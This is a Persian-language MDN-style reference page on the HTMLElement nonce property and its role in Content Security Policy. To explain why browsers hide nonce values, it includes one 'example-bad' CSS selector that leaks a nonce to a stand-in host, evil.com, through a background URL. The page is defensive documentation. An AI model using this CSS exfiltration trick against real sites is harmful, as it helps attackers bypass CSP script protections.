---
title: "HTMLElement: nonce property"
---

---
title: "HTMLElement: nonce property"
short-title: nonce
slug: Web/API/HTMLElement/nonce
page-type: web-api-instance-property
browser-compat: api.HTMLElement.nonce
---

{{APIRef("HTML DOM")}}

ویژگی **`nonce`** در رابط {{DOMxRef("HTMLElement")}} عدد رمزنگاری یک‌بارمصرف (nonce) را برمی‌گرداند که توسط [خط‌مشی امنیت محتوا](/en-US/docs/Web/HTTP/Guides/CSP) برای تعیین اینکه آیا یک درخواست (fetch) مشخص مجاز است ادامه یابد استفاده می‌شود.

در پیاده‌سازی‌های جدیدتر، عناصر ویژگی `nonce` خود را فقط در دسترس اسکریپت‌ها قرار می‌دهند (و نه کانال‌های جانبی مانند انتخاب‌گرهای ویژگی CSS).

## مثال‌ها

### دریافت مقدار nonce

در گذشته، همه مرورگرها از ویژگی IDL `nonce` پشتیبانی نمی‌کردند؛ بنابراین یک راه‌حل جایگزین این است که از [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) به‌عنوان بازگشت به عقب (fallback) استفاده کنید:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

با این حال، نسخه‌های اخیر مرورگرها مقادیر `nonce` را که از این طریق دسترسی داده می‌شوند پنهان می‌کنند (یک رشته خالی بازگردانده می‌شود). ویژگی IDL (`script['nonce']`) تنها راه دسترسی به nonceها خواهد بود.

پنهان‌سازی nonce به جلوگیری از استخراج داده‌های nonce توسط مهاجمان از طریق مکانیزم‌هایی که می‌توانند داده‌ها را از ویژگی‌های محتوا دریافت کنند، مانند این انتخاب‌گر CSS، کمک می‌کند:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## مشخصات

{{Specifications}}

## سازگاری مرورگر

{{Compat}}

## همچنین ببینید

- [ویژگی سراسری `nonce`](/en-US/docs/Web/HTML/Reference/Global_attributes/nonce)
- [خط‌مشی امنیت محتوا](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}